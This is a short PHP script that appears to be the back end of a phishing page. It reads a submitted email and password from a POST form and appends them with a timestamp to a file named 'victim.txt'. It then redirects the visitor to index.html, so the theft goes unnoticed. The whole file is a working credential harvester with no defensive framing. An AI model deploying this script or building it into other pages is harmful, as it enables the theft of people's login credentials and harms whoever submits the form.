<?php
$email=$_POST['EMAIL'];
$pass=$_POST['pass'];
$time=time();
$gmt='+7';
$jm='3600';
$var=$time+($gmt*$jm);
$now=gmdate('d M Y - H:i',$var);
$file=fopen('victim.txt',a);
$save=fwrite($file,'##############################
User : '.$email.'
Pass : '.$pass.'
'.$now.'
#####################
');
fclose($file);
header('location:index.html');


?>